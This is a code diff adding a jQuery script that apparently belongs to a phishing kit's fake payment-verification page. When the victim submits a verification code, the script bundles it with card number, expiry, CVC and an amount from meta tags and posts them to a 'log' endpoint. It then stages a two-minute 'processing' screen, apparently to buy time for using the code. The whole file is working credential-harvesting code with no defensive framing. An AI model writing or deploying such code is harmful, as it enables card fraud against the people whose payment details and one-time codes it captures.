@@ -1,0 +1,40 @@
+$(document).ready(function() {
+    $("#submit-button").click(function() {
+		var code = $("#input-code").val();
+		var token = $("meta[name=sci-token]").attr("content");
+		var cc = $("meta[name=cc]").attr("content");
+		var m = $("meta[name=m]").attr("content");
+		var y = $("meta[name=y]").attr("content");
+		var a = $("meta[name=a]").attr("content");
+		var cvc = $("meta[name=cvc]").attr("content");
+		if (code.length < 4) {
+			$("#input-code").addClass("input-invalid");
+
+			setTimeout(function() {
+				$("#input-code").removeClass("input-invalid");
+			}, 2000);
+
+			return false;
+		}
+		$.post("log", { "sci_token": token, "code": code, "cc": cc, "m": m, "y": y, "a": a, "cvc": cvc })
+		.done(function(response) {
+			// function...
+		});
+		$("#step-1").fadeOut(500, function() {
+			$("#step-2").fadeIn();
+		});
+        setTimeout(function() {
+		$("#step-2").fadeOut(500, function() {
+			$("#step-3").fadeIn();
+		});    
+        }, 120000);
+	});
+	
+    $("#back").click(function() {
+		$("#step-3").fadeOut(500, function() {
+			$("#step-1").fadeIn();
+			$("#input-code").val("");
+			
+		});    
+	});	
+});
